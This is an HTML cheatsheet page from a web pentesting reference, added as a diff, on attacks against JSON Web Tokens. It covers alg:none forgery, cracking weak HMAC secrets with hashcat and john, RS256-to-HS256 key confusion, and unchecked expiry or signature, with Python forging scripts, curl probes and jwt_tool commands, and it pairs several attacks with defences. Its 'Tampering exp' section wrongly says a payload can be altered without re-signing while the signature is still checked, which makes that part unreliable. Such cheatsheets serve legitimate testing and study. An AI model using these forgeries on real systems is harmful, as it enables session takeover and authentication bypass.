@@ -1,0 +1,209 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>JWT · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Authentication &amp; Sessions</nav><h1>JWT</h1><p class="cx-lede">JSON Web Token attacks - alg:none, weak signing keys, key confusion, expired-but-accepted tokens, and claim tampering.</p><div class="cx-tags"><span class="cx-tag">MITRE T1539, T1606</span><span class="cx-tag">D3FEND D3-MENCR, D3-CH</span><span class="cx-tag">IMPACT SessionTakeover, AuthBypass</span><span class="cx-tag">OWASP A02, A07</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>JWTs are stateless authentication tokens carrying claims (user, role, expiry) signed by the server. The signature is supposed to prevent tampering - when the signature check is weak or skipped, tampering becomes account-takeover.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Recognize a JWT - three base64 segments separated by dots
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaHRiIiwicm9sZSI6InVzZXIifQ.signature
+
+# Attack 1 - alg:none (server accepts unsigned tokens)
+Change header alg to &quot;none&quot;, strip signature
+{&quot;alg&quot;:&quot;HS256&quot;}  →  {&quot;alg&quot;:&quot;none&quot;}
+
+# Attack 2 - weak HMAC key (brute-force the secret)
+hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+
+# Attack 3 - algorithm confusion (RS256 → HS256, use public key as HMAC secret)
+# Many JWT libraries accept any signature when the algorithm is changed
+
+# Attack 4 - expired but accepted (server doesn&#x27;t check exp claim)
+Set exp far in the future or remove it entirely</code></pre></figure>
+<p>Success indicator: server accepts a JWT you constructed with claims you chose - typically a different user or elevated role.</p>
+<h2 id="jwt-structure">JWT structure</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>header.payload.signature</code></pre></figure>
+<p>Each segment is base64url-encoded JSON. Header declares the algorithm, payload contains the claims, signature is computed over the first two segments.</p>
+<h3 id="example-decoded">Example decoded</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Header   {&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}
+Payload  {&quot;sub&quot;:&quot;appuser&quot;,&quot;role&quot;:&quot;user&quot;,&quot;iat&quot;:1647135274,&quot;exp&quot;:1647138874}</code></pre></figure>
+<p>Standard payload claims:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>sub        Subject (user identifier)
+iat        Issued at (Unix timestamp)
+exp        Expires at (Unix timestamp)
+nbf        Not valid before (Unix timestamp)
+iss        Issuer
+aud        Audience
+jti        JWT ID (unique identifier for revocation)</code></pre></figure>
+<p>Application-specific claims (<code>role</code>, <code>permissions</code>, <code>email</code>, etc.) are added freely. The cleanly-separated payload is exactly what makes JWT attractive for tampering attempts.</p>
+<h3 id="decoding-a-jwt">Decoding a JWT</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Just split on dots and base64url-decode the parts
+TOKEN=&quot;eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaHRiIiwicm9sZSI6InVzZXIifQ.signature&quot;
+echo &quot;$TOKEN&quot; | cut -d. -f1 | base64 -d 2&gt;/dev/null
+echo &quot;$TOKEN&quot; | cut -d. -f2 | base64 -d 2&gt;/dev/null</code></pre></figure>
+<p>Base64URL is a variant of base64 with <code>-</code> and <code>_</code> instead of <code>+</code> and <code>/</code>, and no padding. The <code>base64 -d</code> may complain about padding - append <code>=</code> characters to make the length a multiple of 4.</p>
+<p>Easier: paste the token at <a href="https://jwt.io">jwt.io</a> for a parsed view (privacy aside - never paste production tokens to third-party services).</p>
+<h2 id="attack-1-algnone">Attack 1 - <code>alg:none</code></h2>
+<p>The original JWT vulnerability. Set the <code>alg</code> header to <code>none</code> and drop the signature; some libraries accept this as a valid unsigned token.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Original
+header   {&quot;alg&quot;:&quot;HS256&quot;}
+payload  {&quot;user&quot;:&quot;bob&quot;,&quot;role&quot;:&quot;user&quot;}
+signature  XYZ
+
+# Attack
+header   {&quot;alg&quot;:&quot;none&quot;}
+payload  {&quot;user&quot;:&quot;bob&quot;,&quot;role&quot;:&quot;admin&quot;}
+signature  (empty)</code></pre></figure>
+<p>Full constructed token:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiaHRiIiwicm9sZSI6ImFkbWluIn0.</code></pre></figure>
+<p>Note the trailing dot - the signature section is empty but the dot remains.</p>
+<h3 id="variations-to-try">Variations to try</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&quot;alg&quot;: &quot;none&quot;
+&quot;alg&quot;: &quot;None&quot;
+&quot;alg&quot;: &quot;NONE&quot;
+&quot;alg&quot;: &quot;nOnE&quot;
+&quot;alg&quot;: &quot;&quot;</code></pre></figure>
+<p>Case sensitivity is library-specific - some libraries normalize, some don't. Try all variants.</p>
+<h3 id="detection-exploitation">Detection / exploitation</h3>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import base64
+import json
+
+# Decode the original token
+parts = token.split(&#x27;.&#x27;)
+header = json.loads(base64.urlsafe_b64decode(parts[0] + &#x27;==&#x27;).decode())
+payload = json.loads(base64.urlsafe_b64decode(parts[1] + &#x27;==&#x27;).decode())
+
+# Modify
+header[&#x27;alg&#x27;] = &#x27;none&#x27;
+payload[&#x27;role&#x27;] = &#x27;admin&#x27;
+
+# Re-encode
+def b64url(d):
+    return base64.urlsafe_b64encode(json.dumps(d, separators=(&#x27;,&#x27;,&#x27;:&#x27;)).encode()).decode().rstrip(&#x27;=&#x27;)
+
+forged = f&quot;{b64url(header)}.{b64url(payload)}.&quot;
+print(forged)</code></pre></figure>
+<h3 id="defending-against-this">Defending against this</h3>
+<p>Most modern JWT libraries reject <code>alg:none</code> by default. The bug appears in:
+- Older library versions (pre-2015 - the original disclosure period)
+- Custom implementations
+- Multi-language stacks where a token signed by Library A is verified by Library B</p>
+<h2 id="attack-2-weak-hmac-key">Attack 2 - Weak HMAC key</h2>
+<p>When <code>alg</code> is <code>HS256</code> (or <code>HS384</code>, <code>HS512</code>), the signature is an HMAC over the header+payload using a secret key. If the secret is weak (short, dictionary word, predictable), brute-force the secret offline:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># hashcat mode 16500 = JWT HMAC
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+
+# john the ripper
+john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256</code></pre></figure>
+<p><code>jwt.txt</code> should contain just the full JWT. Hashcat extracts the parts and tests each wordlist entry as the HMAC secret.</p>
+<h3 id="common-weak-secrets">Common weak secrets</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>secret
+secret123
+jwt-secret
+your-256-bit-secret
+changeme
+password
+&lt;companyname&gt;
+&lt;companyname&gt;123</code></pre></figure>
+<p>If hashcat reveals the secret, you can forge arbitrary tokens. Test the secret:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import jwt
+
+SECRET = &quot;found-secret&quot;
+payload = {&quot;sub&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;, &quot;exp&quot;: 9999999999}
+forged = jwt.encode(payload, SECRET, algorithm=&#x27;HS256&#x27;)
+print(forged)</code></pre></figure>
+<h3 id="defending-against-this_1">Defending against this</h3>
+<p>Use cryptographic-strength random keys (256+ bits of entropy). Never use dictionary words. Rotate keys when they leak.</p>
+<h2 id="attack-3-algorithm-confusion-rs256-hs256">Attack 3 - Algorithm confusion (RS256 → HS256)</h2>
+<p>Subtle and devastating. When the server's verification code looks like:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python"># Vulnerable
+verify(token, public_key)</code></pre></figure>
+<p>…and the JWT library picks the verification algorithm from the token's header, an attacker can:</p>
+<ol>
+<li>Take the server's public key (RSA public keys are public by design - often on a <code>.well-known/jwks.json</code> endpoint)</li>
+<li>Change the token's <code>alg</code> from <code>RS256</code> to <code>HS256</code></li>
+<li>Sign the token with HMAC using the public key as the HMAC secret</li>
+<li>Server reads <code>alg:HS256</code>, verifies the HMAC using the (public) key, validates the token</li>
+</ol>
+<p>The bug is that the server's "public key" is now being used as an HMAC secret - which the attacker also has. The attacker can forge any token.</p>
+<h3 id="exploitation">Exploitation</h3>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import jwt
+
+# Read the server&#x27;s public key (often at /.well-known/jwks.json or .pem)
+with open(&#x27;server-public.pem&#x27;) as f:
+    public_key = f.read()
+
+# Forge token signed with HMAC using the public key as the secret
+payload = {&quot;sub&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;}
+forged = jwt.encode(payload, public_key, algorithm=&#x27;HS256&#x27;)
+print(forged)</code></pre></figure>
+<p>Note: <code>public_key</code> here is the literal text of the PEM file. The exact byte sequence matters - extra whitespace or line endings can change the HMAC and break the forgery.</p>
+<h3 id="defending-against-this_2">Defending against this</h3>
+<p>The server should enforce a specific algorithm rather than reading it from the token:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python"># Correct
+jwt.decode(token, public_key, algorithms=[&#x27;RS256&#x27;])</code></pre></figure>
+<p><code>algorithms=['RS256']</code> rejects HS256 tokens outright, defeating the confusion.</p>
+<h2 id="attack-4-expiry-not-checked">Attack 4 - Expiry not checked</h2>
+<p>Some applications validate the signature but don't check <code>exp</code> (expiry) or <code>nbf</code> (not-before). Tokens are accepted long after they should have expired - useful when you've captured an old token (cached in logs, leaked in Git history, etc.).</p>
+<h3 id="testing">Testing</h3>
+<p>Capture a valid token. Note its <code>exp</code> claim. Wait until past <code>exp</code>. Resubmit:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -H &quot;Authorization: Bearer $OLD_TOKEN&quot; https://&lt;TARGET&gt;/api/me</code></pre></figure>
+<ul>
+<li>401 Unauthorized → expiry is enforced</li>
+<li>200 OK with valid response → expiry is not enforced (bug)</li>
+</ul>
+<h3 id="tampering-exp">Tampering exp</h3>
+<p>If signature is unforgeable but expiry is unchecked:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python"># Decode payload, set exp far in the future
+import time
+payload[&#x27;exp&#x27;] = int(time.time()) + 365*86400         # 1 year from now
+# Re-encode without changing signature - the server won&#x27;t notice</code></pre></figure>
+<p>This only works when the server checks the signature but not the expiry separately - a strange but documented failure mode.</p>
+<h2 id="attack-5-claim-tampering-with-no-signature-check">Attack 5 - Claim tampering with no signature check</h2>
+<p>The simplest case: server doesn't verify the signature at all (developer mistake, debug mode left on). Modify any claim, leave the signature unchanged (or empty):</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">payload[&#x27;role&#x27;] = &#x27;admin&#x27;
+# Resubmit with original signature → still works</code></pre></figure>
+<p>Detection:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Submit a token with a deliberately-wrong signature
+curl -H &quot;Authorization: Bearer ${HEADER}.${PAYLOAD}.WRONGSIGNATURE&quot; https://&lt;TARGET&gt;/api/me
+
+# If response is 200 with expected data → signature isn&#x27;t being checked at all</code></pre></figure>
+<p>A surprisingly common pattern - applications that "use JWT for sessions" sometimes treat them as opaque blobs and trust the contents.</p>
+<h2 id="tooling">Tooling</h2>
+<p>For systematic testing:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># jwt_tool - comprehensive JWT testing
+# https://github.com/ticarpi/jwt_tool
+python3 jwt_tool.py $TOKEN -M pb               # playbook mode - tries common attacks
+python3 jwt_tool.py $TOKEN -X a                # alg:none variants
+python3 jwt_tool.py $TOKEN -X k -pk pubkey.pem # key confusion attack
+python3 jwt_tool.py $TOKEN -C -d rockyou.txt   # crack weak HMAC
+
+# Burp Suite - JWT Editor extension (BApp Store)
+# Provides UI for header/payload editing and signature operations</code></pre></figure>
+<h2 id="detection-only-checks">Detection-only checks</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Identify whether the application uses JWTs at all
+# Check Authorization headers, cookies, response bodies
+
+# In a captured request
+curl -s -H &quot;Authorization: Bearer $TOKEN&quot; https://&lt;TARGET&gt;/api/me
+
+# Look for three-segment dot-separated structures
+# That&#x27;s the surest &quot;this is a JWT&quot; signal
+
+# Check the algorithm and confirm strength
+echo &quot;$TOKEN&quot; | cut -d. -f1 | base64 -d 2&gt;/dev/null
+# Look for: &quot;alg&quot;:&quot;HS256&quot;  / &quot;RS256&quot; / &quot;ES256&quot; / &quot;none&quot;</code></pre></figure>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>JWT is convenient and frequently misused.</strong> The "stateless session" argument is real but most applications don't actually need that property - and the tradeoffs (no easy revocation, larger cookies, complex algorithm handling) often outweigh the benefit.</li>
+<li><strong>Algorithm confusion is library-version-dependent.</strong> PyJWT and node-jsonwebtoken both had this bug in older versions. Most patched versions (post-2017) require explicit algorithm specification. The bug is mostly historical at this point but appears occasionally in legacy systems.</li>
+<li><strong><code>kid</code> header injection.</strong> A separate attack: the <code>kid</code> (key ID) header tells the server which key to use for verification. If the server reads this from a database or file system based on the attacker-supplied value, SQL injection / path traversal in the <code>kid</code> is possible. Out of scope for this overview - see jwt_tool's <code>-X</code> modes.</li>
+<li><strong>Refresh tokens are usually JWTs too.</strong> When testing JWT auth, look for both access tokens (short-lived, sent on every request) and refresh tokens (long-lived, used to get new access tokens). Refresh tokens are higher-value targets because of the longer lifetime.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>JWT tokens often contain real user data in the payload (email, roles, group memberships, sometimes more). When demonstrating an attack, redact this content from any report or screenshot - the payload contents can be PII or sensitive in their own right.</p>
+</div>
+<p>This page is a starter - JWT has enough attack surface for several dedicated pages (key confusion in depth, JWS vs JWE, ECDSA signature malleability, JWK injection). Those exist as planned expansions; for now, the attacks above cover the operationally common cases.</p></article><nav class="cx-pager"><a class="cx-prev" href="../session-fixation/index.html">Previous: Session fixation &amp; token exposure</a><a class="cx-next" href="../verb-tampering/index.html">Next: HTTP verb tampering</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
